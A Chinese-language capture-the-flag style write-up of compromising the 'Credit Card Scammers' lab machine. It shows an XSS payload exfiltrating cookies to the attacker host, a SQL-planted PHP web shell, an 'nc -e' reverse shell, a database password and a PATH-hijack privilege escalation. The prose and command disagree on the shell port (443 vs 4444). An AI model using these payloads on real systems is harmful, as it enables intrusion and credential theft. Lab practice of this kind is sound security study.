---
title: Credit Card Scammers Writeup
date: 2025-05-18T17:29:33+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - 技术
---
> 此文章以 kali 地址为 10.10.10.5 为示例

# Credit Card Scammers 靶场

## 服务扫描

扫描所执行的命令，执行结果如下

```bash
sudo nmap -sn 10.10.10.0/24

sudo nmap --min-rate 10000 -p- 10.10.10.31   

sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31 

sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31 
```

![aaa.png](aaa.png)

## gobuster 爆破目录

在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破

```bash
sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt
```

![bbb.png](bbb.png)

## Web 渗透

审计爆破的目录发现在 admin 下有一个登入界面

![ccc.png](ccc.png)

默认界面能找到提交表单

![ddd.png](ddd.png)

尝试 XSS 

```
<script>new Image().src="http://10.10.10.5/?c="+document.cookie;</script>
```

![ee.png](ee.png)

kali 架设连接

```bash
python3 -m http.server 80
```

![fff.png](fff.png)

修改 cookie 登入

![ggg.png](ggg.png)

注入 sql 反弹 shell

```shell
SELECT "<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php'
```

```
http://10.10.10.33/shell.php?cmd=pwd
```

![hhh.png](hhh.png)

连接 shell ，因为防火墙墙掉了不常见端口，因此使用 443 端口

```shell
nc -e /bin/bash 10.10.10.5 4444
```

以下是提权一阶段代码

```shell
cat /etc/passwd |grep "/bin/bash"

cd settings

ls

cat config.php
```

![iii](iii.png)

```shell
mysql -uorders -pOb2UA15ubBtzpZrvdMYT orders -e 'SELECT * from users;' 
```

![jjj](jjj.png)

john 破解

![kkk](kkk.png)

ssh 登入

![lll](lll.png)

二阶段提权

```shell
find / -perm -u=s -type f 2>/dev/null

ls

strings /usr/bin/backup

export PATH=.:$PATH

echo $PATH

cd /tmp 

echo '/bin/bash' > tar

chmod 777 tar

/usr/bin/backup
```

![mmm](mmm.png)

拿下机器